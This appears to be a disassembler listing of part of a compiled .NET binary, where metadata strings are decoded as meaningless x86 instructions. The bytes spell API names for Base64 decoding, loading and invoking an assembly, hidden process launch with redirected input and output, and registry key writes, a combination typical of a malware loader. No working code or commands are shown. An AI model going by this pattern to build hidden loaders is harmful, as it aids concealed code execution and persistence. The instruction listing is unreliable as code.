  40740a:	61                   	popa
  40740b:	64 46                	fs inc %esi
  40740d:	69 6c 65 00 44 69 73 	imul   $0x70736944,0x0(%ebp,%eiz,2),%ebp
  407414:	70 
  407415:	6f                   	outsl  %ds:(%esi),(%dx)
  407416:	73 65                	jae    0x40747d
  407418:	00 43 6f             	add    %al,0x6f(%ebx)
  40741b:	6e                   	outsb  %ds:(%esi),(%dx)
  40741c:	63 61 74             	arpl   %esp,0x74(%ecx)
  40741f:	00 57 72             	add    %dl,0x72(%edi)
  407422:	69 74 65 41 6c 6c 54 	imul   $0x65546c6c,0x41(%ebp,%eiz,2),%esi
  407429:	65 
  40742a:	78 74                	js     0x4074a0
  40742c:	00 57 72             	add    %dl,0x72(%edi)
  40742f:	69 74 65 41 6c 6c 42 	imul   $0x79426c6c,0x41(%ebp,%eiz,2),%esi
  407436:	79 
  407437:	74 65                	je     0x40749e
  407439:	73 00                	jae    0x40743b
  40743b:	45                   	inc    %ebp
  40743c:	6d                   	insl   (%dx),%es:(%edi)
  40743d:	70 74                	jo     0x4074b3
  40743f:	79 00                	jns    0x407441
  407441:	54                   	push   %esp
  407442:	6f                   	outsl  %ds:(%esi),(%dx)
  407443:	53                   	push   %ebx
  407444:	74 72                	je     0x4074b8
  407446:	69 6e 67 00 49 73 4e 	imul   $0x4e734900,0x67(%esi),%ebp
  40744d:	75 6c                	jne    0x4074bb
  40744f:	6c                   	insb   (%dx),%es:(%edi)
  407450:	4f                   	dec    %edi
  407451:	72 45                	jb     0x407498
  407453:	6d                   	insl   (%dx),%es:(%edi)
  407454:	70 74                	jo     0x4074ca
  407456:	79 00                	jns    0x407458
  407458:	6f                   	outsl  %ds:(%esi),(%dx)
  407459:	70 5f                	jo     0x4074ba
  40745b:	49                   	dec    %ecx
  40745c:	6e                   	outsb  %ds:(%esi),(%dx)
  40745d:	65 71 75             	gs jno 0x4074d5
  407460:	61                   	popa
  407461:	6c                   	insb   (%dx),%es:(%edi)
  407462:	69 74 79 00 52 65 61 	imul   $0x64616552,0x0(%ecx,%edi,2),%esi
  407469:	64 
  40746a:	41                   	inc    %ecx
  40746b:	6c                   	insb   (%dx),%es:(%edi)
  40746c:	6c                   	insb   (%dx),%es:(%edi)
  40746d:	54                   	push   %esp
  40746e:	65 78 74             	gs js  0x4074e5
  407471:	00 46 72             	add    %al,0x72(%esi)
  407474:	6f                   	outsl  %ds:(%esi),(%dx)
  407475:	6d                   	insl   (%dx),%es:(%edi)
  407476:	42                   	inc    %edx
  407477:	61                   	popa
  407478:	73 65                	jae    0x4074df
  40747a:	36 34 53             	ss xor $0x53,%al
  40747d:	74 72                	je     0x4074f1
  40747f:	69 6e 67 00 4c 6f 61 	imul   $0x616f4c00,0x67(%esi),%ebp
  407486:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  40748a:	74 5f                	je     0x4074eb
  40748c:	45                   	inc    %ebp
  40748d:	6e                   	outsb  %ds:(%esi),(%dx)
  40748e:	74 72                	je     0x407502
  407490:	79 50                	jns    0x4074e2
  407492:	6f                   	outsl  %ds:(%esi),(%dx)
  407493:	69 6e 74 00 49 6e 76 	imul   $0x766e4900,0x74(%esi),%ebp
  40749a:	6f                   	outsl  %ds:(%esi),(%dx)
  40749b:	6b 65 00 41          	imul   $0x41,0x0(%ebp),%esp
  40749f:	70 70                	jo     0x407511
  4074a1:	65 6e                	outsb  %gs:(%esi),(%dx)
  4074a3:	64 41                	fs inc %ecx
  4074a5:	6c                   	insb   (%dx),%es:(%edi)
  4074a6:	6c                   	insb   (%dx),%es:(%edi)
  4074a7:	54                   	push   %esp
  4074a8:	65 78 74             	gs js  0x40751f
  4074ab:	00 47 65             	add    %al,0x65(%edi)
  4074ae:	74 43                	je     0x4074f3
  4074b0:	75 72                	jne    0x407524
  4074b2:	72 65                	jb     0x407519
  4074b4:	6e                   	outsb  %ds:(%esi),(%dx)
  4074b5:	74 50                	je     0x407507
  4074b7:	72 6f                	jb     0x407528
  4074b9:	63 65 73             	arpl   %esp,0x73(%ebp)
  4074bc:	73 00                	jae    0x4074be
  4074be:	67 65 74 5f          	addr16 gs je 0x407521
  4074c2:	48                   	dec    %eax
  4074c3:	61                   	popa
  4074c4:	6e                   	outsb  %ds:(%esi),(%dx)
  4074c5:	64 6c                	fs insb (%dx),%es:(%edi)
  4074c7:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  4074cb:	74 5f                	je     0x40752c
  4074cd:	49                   	dec    %ecx
  4074ce:	73 41                	jae    0x407511
  4074d0:	74 74                	je     0x407546
  4074d2:	61                   	popa
  4074d3:	63 68 65             	arpl   %ebp,0x65(%eax)
  4074d6:	64 00 45 78          	add    %al,%fs:0x78(%ebp)
  4074da:	69 74 00 43 6f 70 79 	imul   $0x5479706f,0x43(%eax,%eax,1),%esi
  4074e1:	54 
  4074e2:	6f                   	outsl  %ds:(%esi),(%dx)
  4074e3:	00 54 6f 41          	add    %dl,0x41(%edi,%ebp,2)
  4074e7:	72 72                	jb     0x40755b
  4074e9:	61                   	popa
  4074ea:	79 00                	jns    0x4074ec
  4074ec:	49                   	dec    %ecx
  4074ed:	6e                   	outsb  %ds:(%esi),(%dx)
  4074ee:	64 65 78 4f          	fs gs js 0x407541
  4074f2:	66 00 52 65          	data16 add %dl,0x65(%edx)
  4074f6:	70 6c                	jo     0x407564
  4074f8:	61                   	popa
  4074f9:	63 65 00             	arpl   %esp,0x0(%ebp)
  4074fc:	53                   	push   %ebx
  4074fd:	75 62                	jne    0x407561
  4074ff:	73 74                	jae    0x407575
  407501:	72 69                	jb     0x40756c
  407503:	6e                   	outsb  %ds:(%esi),(%dx)
  407504:	67 00 43 6f          	add    %al,0x6f(%bp,%di)
  407508:	6e                   	outsb  %ds:(%esi),(%dx)
  407509:	74 61                	je     0x40756c
  40750b:	69 6e 73 00 41 64 64 	imul   $0x64644100,0x73(%esi),%ebp
  407512:	00 67 65             	add    %ah,0x65(%edi)
  407515:	74 5f                	je     0x407576
  407517:	4c                   	dec    %esp
  407518:	65 6e                	outsb  %gs:(%esi),(%dx)
  40751a:	67 74 68             	addr16 je 0x407585
  40751d:	00 67 65             	add    %ah,0x65(%edi)
  407520:	74 5f                	je     0x407581
  407522:	49                   	dec    %ecx
  407523:	74 65                	je     0x40758a
  407525:	6d                   	insl   (%dx),%es:(%edi)
  407526:	00 52 65             	add    %dl,0x65(%edx)
  407529:	6d                   	insl   (%dx),%es:(%edi)
  40752a:	6f                   	outsl  %ds:(%esi),(%dx)
  40752b:	76 65                	jbe    0x407592
  40752d:	00 67 65             	add    %ah,0x65(%edi)
  407530:	74 5f                	je     0x407591
  407532:	43                   	inc    %ebx
  407533:	68 61 72 73 00       	push   $0x737261
  407538:	41                   	inc    %ecx
  407539:	70 70                	jo     0x4075ab
  40753b:	65 6e                	outsb  %gs:(%esi),(%dx)
  40753d:	64 00 41 70          	add    %al,%fs:0x70(%ecx)
  407541:	70 65                	jo     0x4075a8
  407543:	6e                   	outsb  %ds:(%esi),(%dx)
  407544:	64 4c                	fs dec %esp
  407546:	69 6e 65 00 67 65 74 	imul   $0x74656700,0x65(%esi),%ebp
  40754d:	5f                   	pop    %edi
  40754e:	53                   	push   %ebx
  40754f:	74 61                	je     0x4075b2
  407551:	72 74                	jb     0x4075c7
  407553:	49                   	dec    %ecx
  407554:	6e                   	outsb  %ds:(%esi),(%dx)
  407555:	66 6f                	outsw  %ds:(%esi),(%dx)
  407557:	00 73 65             	add    %dh,0x65(%ebx)
  40755a:	74 5f                	je     0x4075bb
  40755c:	46                   	inc    %esi
  40755d:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407564:	00 
  407565:	73 65                	jae    0x4075cc
  407567:	74 5f                	je     0x4075c8
  407569:	41                   	inc    %ecx
  40756a:	72 67                	jb     0x4075d3
  40756c:	75 6d                	jne    0x4075db
  40756e:	65 6e                	outsb  %gs:(%esi),(%dx)
  407570:	74 73                	je     0x4075e5
  407572:	00 73 65             	add    %dh,0x65(%ebx)
  407575:	74 5f                	je     0x4075d6
  407577:	57                   	push   %edi
  407578:	6f                   	outsl  %ds:(%esi),(%dx)
  407579:	72 6b                	jb     0x4075e6
  40757b:	69 6e 67 44 69 72 65 	imul   $0x65726944,0x67(%esi),%ebp
  407582:	63 74 6f 72          	arpl   %esi,0x72(%edi,%ebp,2)
  407586:	79 00                	jns    0x407588
  407588:	73 65                	jae    0x4075ef
  40758a:	74 5f                	je     0x4075eb
  40758c:	55                   	push   %ebp
  40758d:	73 65                	jae    0x4075f4
  40758f:	53                   	push   %ebx
  407590:	68 65 6c 6c 45       	push   $0x456c6c65
  407595:	78 65                	js     0x4075fc
  407597:	63 75 74             	arpl   %esi,0x74(%ebp)
  40759a:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  40759e:	74 5f                	je     0x4075ff
  4075a0:	43                   	inc    %ebx
  4075a1:	72 65                	jb     0x407608
  4075a3:	61                   	popa
  4075a4:	74 65                	je     0x40760b
  4075a6:	4e                   	dec    %esi
  4075a7:	6f                   	outsl  %ds:(%esi),(%dx)
  4075a8:	57                   	push   %edi
  4075a9:	69 6e 64 6f 77 00 73 	imul   $0x7300776f,0x64(%esi),%ebp
  4075b0:	65 74 5f             	gs je  0x407612
  4075b3:	52                   	push   %edx
  4075b4:	65 64 69 72 65 63 74 	gs imul $0x74537463,%fs:0x65(%edx),%esi
  4075bb:	53 74 
  4075bd:	61                   	popa
  4075be:	6e                   	outsb  %ds:(%esi),(%dx)
  4075bf:	64 61                	fs popa
  4075c1:	72 64                	jb     0x407627
  4075c3:	49                   	dec    %ecx
  4075c4:	6e                   	outsb  %ds:(%esi),(%dx)
  4075c5:	70 75                	jo     0x40763c
  4075c7:	74 00                	je     0x4075c9
  4075c9:	73 65                	jae    0x407630
  4075cb:	74 5f                	je     0x40762c
  4075cd:	52                   	push   %edx
  4075ce:	65 64 69 72 65 63 74 	gs imul $0x74537463,%fs:0x65(%edx),%esi
  4075d5:	53 74 
  4075d7:	61                   	popa
  4075d8:	6e                   	outsb  %ds:(%esi),(%dx)
  4075d9:	64 61                	fs popa
  4075db:	72 64                	jb     0x407641
  4075dd:	4f                   	dec    %edi
  4075de:	75 74                	jne    0x407654
  4075e0:	70 75                	jo     0x407657
  4075e2:	74 00                	je     0x4075e4
  4075e4:	61                   	popa
  4075e5:	64 64 5f             	fs fs pop %edi
  4075e8:	4f                   	dec    %edi
  4075e9:	75 74                	jne    0x40765f
  4075eb:	70 75                	jo     0x407662
  4075ed:	74 44                	je     0x407633
  4075ef:	61                   	popa
  4075f0:	74 61                	je     0x407653
  4075f2:	52                   	push   %edx
  4075f3:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  4075f7:	76 65                	jbe    0x40765e
  4075f9:	64 00 53 74          	add    %dl,%fs:0x74(%ebx)
  4075fd:	61                   	popa
  4075fe:	72 74                	jb     0x407674
  407600:	00 42 65             	add    %al,0x65(%edx)
  407603:	67 69 6e 4f 75 74 70 	imul   $0x75707475,0x4f(%bp),%ebp
  40760a:	75 
  40760b:	74 52                	je     0x40765f
  40760d:	65 61                	gs popa
  40760f:	64 4c                	fs dec %esp
  407611:	69 6e 65 00 57 61 69 	imul   $0x69615700,0x65(%esi),%ebp
  407618:	74 46                	je     0x407660
  40761a:	6f                   	outsl  %ds:(%esi),(%dx)
  40761b:	72 45                	jb     0x407662
  40761d:	78 69                	js     0x407688
  40761f:	74 00                	je     0x407621
  407621:	47                   	inc    %edi
  407622:	65 74 44             	gs je  0x407669
  407625:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  40762c:	79 4e                	jns    0x40767c
  40762e:	61                   	popa
  40762f:	6d                   	insl   (%dx),%es:(%edi)
  407630:	65 00 43 72          	add    %al,%gs:0x72(%ebx)
  407634:	65 61                	gs popa
  407636:	74 65                	je     0x40769d
  407638:	44                   	inc    %esp
  407639:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  407640:	79 00                	jns    0x407642
  407642:	67 65 74 5f          	addr16 gs je 0x4076a5
  407646:	44                   	inc    %esp
  407647:	61                   	popa
  407648:	74 61                	je     0x4076ab
  40764a:	00 54 72 69          	add    %dl,0x69(%edx,%esi,2)
  40764e:	6d                   	insl   (%dx),%es:(%edi)
  40764f:	00 47 65             	add    %al,0x65(%edi)
  407652:	74 46                	je     0x40769a
  407654:	72 61                	jb     0x4076b7
  407656:	6d                   	insl   (%dx),%es:(%edi)
  407657:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  40765b:	74 4d                	je     0x4076aa
  40765d:	65 74 68             	gs je  0x4076c8
  407660:	6f                   	outsl  %ds:(%esi),(%dx)
  407661:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  407665:	74 5f                	je     0x4076c6
  407667:	44                   	inc    %esp
  407668:	65 63 6c 61 72       	arpl   %ebp,%gs:0x72(%ecx,%eiz,2)
  40766d:	69 6e 67 54 79 70 65 	imul   $0x65707954,0x67(%esi),%ebp
  407674:	00 47 65             	add    %al,0x65(%edi)
  407677:	74 54                	je     0x4076cd
  407679:	79 70                	jns    0x4076eb
  40767b:	65 46                	gs inc %esi
  40767d:	72 6f                	jb     0x4076ee
  40767f:	6d                   	insl   (%dx),%es:(%edi)
  407680:	48                   	dec    %eax
  407681:	61                   	popa
  407682:	6e                   	outsb  %ds:(%esi),(%dx)
  407683:	64 6c                	fs insb (%dx),%es:(%edi)
  407685:	65 00 6f 70          	add    %ch,%gs:0x70(%edi)
  407689:	5f                   	pop    %edi
  40768a:	45                   	inc    %ebp
  40768b:	71 75                	jno    0x407702
  40768d:	61                   	popa
  40768e:	6c                   	insb   (%dx),%es:(%edi)
  40768f:	69 74 79 00 54 72 79 	imul   $0x47797254,0x0(%ecx,%edi,2),%esi
  407696:	47 
  407697:	65 74 56             	gs je  0x4076f0
  40769a:	61                   	popa
  40769b:	6c                   	insb   (%dx),%es:(%edi)
  40769c:	75 65                	jne    0x407703
  40769e:	00 45 6e             	add    %al,0x6e(%ebp)
  4076a1:	74 65                	je     0x407708
  4076a3:	72 00                	jb     0x4076a5
  4076a5:	47                   	inc    %edi
  4076a6:	65 74 45             	gs je  0x4076ee
  4076a9:	78 65                	js     0x407710
  4076ab:	63 75 74             	arpl   %esi,0x74(%ebp)
  4076ae:	69 6e 67 41 73 73 65 	imul   $0x65737341,0x67(%esi),%ebp
  4076b5:	6d                   	insl   (%dx),%es:(%edi)
  4076b6:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  4076ba:	47                   	inc    %edi
  4076bb:	65 74 43             	gs je  0x407701
  4076be:	61                   	popa
  4076bf:	6c                   	insb   (%dx),%es:(%edi)
  4076c0:	6c                   	insb   (%dx),%es:(%edi)
  4076c1:	69 6e 67 41 73 73 65 	imul   $0x65737341,0x67(%esi),%ebp
  4076c8:	6d                   	insl   (%dx),%es:(%edi)
  4076c9:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  4076cd:	47                   	inc    %edi
  4076ce:	65 74 4d             	gs je  0x40771e
  4076d1:	61                   	popa
  4076d2:	6e                   	outsb  %ds:(%esi),(%dx)
  4076d3:	69 66 65 73 74 52 65 	imul   $0x65527473,0x65(%esi),%esp
  4076da:	73 6f                	jae    0x40774b
  4076dc:	75 72                	jne    0x407750
  4076de:	63 65 53             	arpl   %esp,0x53(%ebp)
  4076e1:	74 72                	je     0x407755
  4076e3:	65 61                	gs popa
  4076e5:	6d                   	insl   (%dx),%es:(%edi)
  4076e6:	00 73 65             	add    %dh,0x65(%ebx)
  4076e9:	74 5f                	je     0x40774a
  4076eb:	50                   	push   %eax
  4076ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4076ed:	73 69                	jae    0x407758
  4076ef:	74 69                	je     0x40775a
  4076f1:	6f                   	outsl  %ds:(%esi),(%dx)
  4076f2:	6e                   	outsb  %ds:(%esi),(%dx)
  4076f3:	00 67 65             	add    %ah,0x65(%edi)
  4076f6:	74 5f                	je     0x407757
  4076f8:	55                   	push   %ebp
  4076f9:	6e                   	outsb  %ds:(%esi),(%dx)
  4076fa:	69 63 6f 64 65 00 47 	imul   $0x47006564,0x6f(%ebx),%esp
  407701:	65 74 53             	gs je  0x407757
  407704:	74 72                	je     0x407778
  407706:	69 6e 67 00 49 6e 74 	imul   $0x746e4900,0x67(%esi),%ebp
  40770d:	65 72 6e             	gs jb  0x40777e
  407710:	00 73 65             	add    %dh,0x65(%ebx)
  407713:	74 5f                	je     0x407774
  407715:	49                   	dec    %ecx
  407716:	74 65                	je     0x40777d
  407718:	6d                   	insl   (%dx),%es:(%edi)
  407719:	00 67 65             	add    %ah,0x65(%edi)
  40771c:	74 5f                	je     0x40777d
  40771e:	43                   	inc    %ebx
  40771f:	6f                   	outsl  %ds:(%esi),(%dx)
  407720:	75 6e                	jne    0x407790
  407722:	74 00                	je     0x407724
  407724:	47                   	inc    %edi
  407725:	65 74 4e             	gs je  0x407776
  407728:	61                   	popa
  407729:	6d                   	insl   (%dx),%es:(%edi)
  40772a:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  40772e:	74 5f                	je     0x40778f
  407730:	46                   	inc    %esi
  407731:	75 6c                	jne    0x40779f
  407733:	6c                   	insb   (%dx),%es:(%edi)
  407734:	4e                   	dec    %esi
  407735:	61                   	popa
  407736:	6d                   	insl   (%dx),%es:(%edi)
  407737:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  40773b:	74 50                	je     0x40778d
  40773d:	75 62                	jne    0x4077a1
  40773f:	6c                   	insb   (%dx),%es:(%edi)
  407740:	69 63 4b 65 79 54 6f 	imul   $0x6f547965,0x4b(%ebx),%esp
  407747:	6b 65 6e 00          	imul   $0x0,0x6e(%ebp),%esp
  40774b:	67 65 74 5f          	addr16 gs je 0x4077ae
  40774f:	41                   	inc    %ecx
  407750:	73 73                	jae    0x4077c5
  407752:	65 6d                	gs insl (%dx),%es:(%edi)
  407754:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  407758:	52                   	push   %edx
  407759:	65 61                	gs popa
  40775b:	64 42                	fs inc %edx
  40775d:	79 74                	jns    0x4077d3
  40775f:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  407763:	61                   	popa
  407764:	64 00 43 6c          	add    %al,%fs:0x6c(%ebx)
  407768:	6f                   	outsl  %ds:(%esi),(%dx)
  407769:	73 65                	jae    0x4077d0
  40776b:	00 42 6c             	add    %al,0x6c(%edx)
  40776e:	6f                   	outsl  %ds:(%esi),(%dx)
  40776f:	63 6b 43             	arpl   %ebp,0x43(%ebx)
  407772:	6f                   	outsl  %ds:(%esi),(%dx)
  407773:	70 79                	jo     0x4077ee
  407775:	00 43 75             	add    %al,0x75(%ebx)
  407778:	72 72                	jb     0x4077ec
  40777a:	65 6e                	outsb  %gs:(%esi),(%dx)
  40777c:	74 55                	je     0x4077d3
  40777e:	73 65                	jae    0x4077e5
  407780:	72 00                	jb     0x407782
  407782:	4f                   	dec    %edi
  407783:	70 65                	jo     0x4077ea
  407785:	6e                   	outsb  %ds:(%esi),(%dx)
  407786:	53                   	push   %ebx
  407787:	75 62                	jne    0x4077eb
  407789:	4b                   	dec    %ebx
  40778a:	65 79 00             	gs jns 0x40778d
  40778d:	4c                   	dec    %esp
  40778e:	6f                   	outsl  %ds:(%esi),(%dx)
  40778f:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  407792:	4d                   	dec    %ebp
  407793:	61                   	popa
  407794:	63 68 69             	arpl   %ebp,0x69(%eax)
  407797:	6e                   	outsb  %ds:(%esi),(%dx)
  407798:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  40779c:	74 56                	je     0x4077f4
  40779e:	61                   	popa
  40779f:	6c                   	insb   (%dx),%es:(%edi)
  4077a0:	75 65                	jne    0x407807
  4077a2:	00 43 72             	add    %al,0x72(%ebx)
  4077a5:	65 61                	gs popa
  4077a7:	74 65                	je     0x40780e
  4077a9:	53                   	push   %ebx
  4077aa:	75 62                	jne    0x40780e
  4077ac:	4b                   	dec    %ebx
  4077ad:	65 79 00             	gs jns 0x4077b0
  4077b0:	53                   	push   %ebx
  4077b1:	65 74 56             	gs je  0x40780a
  4077b4:	61                   	popa
  4077b5:	6c                   	insb   (%dx),%es:(%edi)
  4077b6:	75 65                	jne    0x40781d
  4077b8:	00 67 65             	add    %ah,0x65(%edi)
  4077bb:	74 5f                	je     0x40781c
  4077bd:	4f                   	dec    %edi
  4077be:	53                   	push   %ebx
  4077bf:	56                   	push   %esi
  4077c0:	65 72 73             	gs jb  0x407836
  4077c3:	69 6f 6e 00 67 65 74 	imul   $0x74656700,0x6e(%edi),%ebp
  4077ca:	5f                   	pop    %edi
  4077cb:	56                   	push   %esi
  4077cc:	65 72 73             	gs jb  0x407842
  4077cf:	69 6f 6e 00 67 65 74 	imul   $0x74656700,0x6e(%edi),%ebp
  4077d6:	5f                   	pop    %edi
  4077d7:	4d                   	dec    %ebp
  4077d8:	61                   	popa
  4077d9:	6a 6f                	push   $0x6f
  4077db:	72 00                	jb     0x4077dd
  4077dd:	67 65 74 5f          	addr16 gs je 0x407840
  4077e1:	53                   	push   %ebx
  4077e2:	69 7a 65 00 5a 65 72 	imul   $0x72655a00,0x65(%edx),%edi
  4077e9:	6f                   	outsl  %ds:(%esi),(%dx)
  4077ea:	00 6f 70             	add    %ch,0x70(%edi)
  4077ed:	5f                   	pop    %edi
  4077ee:	45                   	inc    %ebp
  4077ef:	78 70                	js     0x407861
  4077f1:	6c                   	insb   (%dx),%es:(%edi)
  4077f2:	69 63 69 74 00 43 6f 	imul   $0x6f430074,0x69(%ebx),%esp
  4077f9:	70 79                	jo     0x407874
  4077fb:	00 53 69             	add    %dl,0x69(%ebx)
  4077fe:	7a 65                	jp     0x407865
  407800:	4f                   	dec    %edi
  407801:	66 00 52 65          	data16 add %dl,0x65(%edx)
  407805:	61                   	popa
  407806:	64 49                	fs dec %ecx
  407808:	6e                   	outsb  %ds:(%esi),(%dx)
  407809:	74 33                	je     0x40783e
  40780b:	32 00                	xor    (%eax),%al
  40780d:	52                   	push   %edx
  40780e:	65 61                	gs popa
  407810:	64 49                	fs dec %ecx
  407812:	6e                   	outsb  %ds:(%esi),(%dx)
  407813:	74 31                	je     0x407846
  407815:	36 00 67 65          	add    %ah,%ss:0x65(%edi)
  407819:	74 5f                	je     0x40787a
  40781b:	4d                   	dec    %ebp
  40781c:	6f                   	outsl  %ds:(%esi),(%dx)
  40781d:	64 75 6c             	fs jne 0x40788c
  407820:	65 73 00             	gs jae 0x407823
  407823:	67 65 74 5f          	addr16 gs je 0x407886
  407827:	43                   	inc    %ebx
  407828:	75 72                	jne    0x40789c
  40782a:	72 65                	jb     0x407891
  40782c:	6e                   	outsb  %ds:(%esi),(%dx)
  40782d:	74 00                	je     0x40782f
  40782f:	67 65 74 5f          	addr16 gs je 0x407892
  407833:	46                   	inc    %esi
  407834:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  40783b:	00 
  40783c:	54                   	push   %esp
  40783d:	6f                   	outsl  %ds:(%esi),(%dx)
  40783e:	4c                   	dec    %esp
  40783f:	6f                   	outsl  %ds:(%esi),(%dx)
  407840:	77 65                	ja     0x4078a7
  407842:	72 00                	jb     0x407844
  407844:	45                   	inc    %ebp
  407845:	6e                   	outsb  %ds:(%esi),(%dx)
  407846:	64 73 57             	fs jae 0x4078a0
  407849:	69 74 68 00 67 65 74 	imul   $0x5f746567,0x0(%eax,%ebp,2),%esi
  407850:	5f 
  407851:	42                   	inc    %edx
  407852:	61                   	popa
  407853:	73 65                	jae    0x4078ba
  407855:	41                   	inc    %ecx
  407856:	64 64 72 65          	fs fs jb 0x4078bf
  40785a:	73 73                	jae    0x4078cf
  40785c:	00 4d 6f             	add    %cl,0x6f(%ebp)
  40785f:	76 65                	jbe    0x4078c6
  407861:	4e                   	dec    %esi
  407862:	65 78 74             	gs js  0x4078d9
  407865:	00 54 6f 49          	add    %dl,0x49(%edi,%ebp,2)
  407869:	6e                   	outsb  %ds:(%esi),(%dx)
  40786a:	74 36                	je     0x4078a2
  40786c:	34 00                	xor    $0x0,%al
  40786e:	50                   	push   %eax
  40786f:	74 72                	je     0x4078e3
  407871:	54                   	push   %esp
  407872:	6f                   	outsl  %ds:(%esi),(%dx)
  407873:	53                   	push   %ebx
  407874:	74 72                	je     0x4078e8
  407876:	69 6e 67 41 6e 73 69 	imul   $0x69736e41,0x67(%esi),%ebp
  40787d:	00 45 71             	add    %al,0x71(%ebp)
  407880:	75 61                	jne    0x4078e3
  407882:	6c                   	insb   (%dx),%es:(%edi)
  407883:	73 00                	jae    0x407885
  407885:	47                   	inc    %edi
  407886:	65 74 4f             	gs je  0x4078d8
  407889:	62 6a 65             	bound  %ebp,0x65(%edx)
  40788c:	63 74 00 41          	arpl   %esi,0x41(%eax,%eax,1)
  407890:	64 64 52             	fs fs push %edx
  407893:	61                   	popa
  407894:	6e                   	outsb  %ds:(%esi),(%dx)
  407895:	67 65 00 67 65       	add    %ah,%gs:0x65(%bx)
  40789a:	74 5f                	je     0x4078fb
  40789c:	4e                   	dec    %esi
  40789d:	61                   	popa
  40789e:	6d                   	insl   (%dx),%es:(%edi)
  40789f:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  4078a3:	74 42                	je     0x4078e7
  4078a5:	79 74                	jns    0x40791b
  4078a7:	65 73 00             	gs jae 0x4078aa
  4078aa:	67 65 74 5f          	addr16 gs je 0x40790d
  4078ae:	4d                   	dec    %ebp
  4078af:	65 74 61             	gs je  0x407913
  4078b2:	64 61                	fs popa
  4078b4:	74 61                	je     0x407917
  4078b6:	54                   	push   %esp
  4078b7:	6f                   	outsl  %ds:(%esi),(%dx)
  4078b8:	6b 65 6e 00          	imul   $0x0,0x6e(%ebp),%esp
  4078bc:	b5 36                	mov    $0x36,%ch
  4078be:	b0 ae                	mov    $0xae,%al
  4078c0:	13 b7 55 4a 7c bd    	adc    -0x4283b5ab(%edi),%esi
  4078c6:	26 7b c2             	es jnp 0x40788b
  4078c9:	42                   	inc    %edx
  4078ca:	55                   	push   %ebp
  4078cb:	1c 00                	sbb    $0x0,%al
  4078cd:	08 b7 7a 5c 56 19    	or     %dh,0x19565c7a(%edi)
  4078d3:	34 e0                	xor    $0xe0,%al
  4078d5:	89 02                	mov    %eax,(%edx)
  4078d7:	06                   	push   %es
  4078d8:	08 04 20             	or     %al,(%eax,%eiz,1)
  4078db:	01 01                	add    %eax,(%ecx)
  4078dd:	08 03                	or     %al,(%ebx)
  4078df:	20 00                	and    %al,(%eax)
  4078e1:	01 03                	add    %eax,(%ebx)
  4078e3:	20 00                	and    %al,(%eax)
  4078e5:	02 03                	add    (%ebx),%al
  4078e7:	20 00                	and    %al,(%eax)
  4078e9:	08 03                	or     %al,(%ebx)
  4078eb:	20 00                	and    %al,(%eax)
  4078ed:	1c 07                	sbb    $0x7,%al
  4078ef:	20 00                	and    %al,(%eax)
  4078f1:	15 12 4c 01 08       	adc    $0x8014c12,%eax
  4078f6:	04 20                	add    $0x20,%al
  4078f8:	00 12                	add    %dl,(%edx)
  4078fa:	44                   	inc    %esp
  4078fb:	02 06                	add    (%esi),%al
  4078fd:	0e                   	push   %cs
  4078fe:	03 00                	add    (%eax),%eax
  407900:	00 01                	add    %al,(%ecx)
  407902:	04 00                	add    $0x0,%al
  407904:	01 01                	add    %eax,(%ecx)
  407906:	0e                   	push   %cs
  407907:	03 00                	add    (%eax),%eax
  407909:	00 02                	add    %al,(%edx)
  40790b:	06                   	push   %es
  40790c:	00 02                	add    %al,(%edx)
  40790e:	02 18                	add    (%eax),%bl
  407910:	10 02                	adc    %al,(%edx)
  407912:	01 02                	add    %eax,(%edx)
  407914:	06                   	push   %es
  407915:	00 01                	add    %al,(%ecx)
  407917:	1d 05 1d 05 04       	sbb    $0x4051d05,%eax
  40791c:	00 01                	add    %al,(%ecx)
  40791e:	0e                   	push   %cs
  40791f:	0e                   	push   %cs
  407920:	04 00                	add    $0x0,%al
  407922:	01 0e                	add    %ecx,(%esi)
  407924:	08 07                	or     %al,(%edi)
  407926:	00 04 0e             	add    %al,(%esi,%ecx,1)
  407929:	0e                   	push   %cs
  40792a:	0e                   	push   %cs
  40792b:	0e                   	push   %cs
  40792c:	08 06                	or     %al,(%esi)
  40792e:	20 02                	and    %al,(%edx)
  407930:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  407933:	49                   	dec    %ecx
  407934:	02 06                	add    (%esi),%al
  407936:	06                   	push   %es
  407937:	07                   	pop    %es
  407938:	06                   	push   %es
  407939:	15 12 2d 02 08       	adc    $0x8022d12,%eax
  40793e:	0e                   	push   %cs
  40793f:	03 06                	add    (%esi),%eax
  407941:	12 28                	adc    (%eax),%ch
  407943:	03 06                	add    (%esi),%eax
  407945:	1d 05 03 06 11       	sbb    $0x11060305,%eax
  40794a:	24 05                	and    $0x5,%al
  40794c:	00 02                	add    %al,(%edx)
  40794e:	0e                   	push   %cs
  40794f:	08 02                	or     %al,(%edx)
  407951:	08 00                	or     %al,(%eax)
  407953:	01 12                	add    %edx,(%edx)
  407955:	80 f5 12             	xor    $0x12,%ch
  407958:	80 dd 07             	sbb    $0x7,%ch
  40795b:	00 01                	add    %al,(%ecx)
  40795d:	1d 05 12 80 f5       	sbb    $0xf5801205,%eax
  407962:	06                   	push   %es
  407963:	00 02                	add    %al,(%edx)
  407965:	02 12                	add    (%edx),%dl
  407967:	71 08                	jno    0x407971
  407969:	08 00                	or     %al,(%eax)
  40796b:	03 01                	add    (%ecx),%eax
  40796d:	1d 05 08 1d 05       	sbb    $0x51d0805,%eax
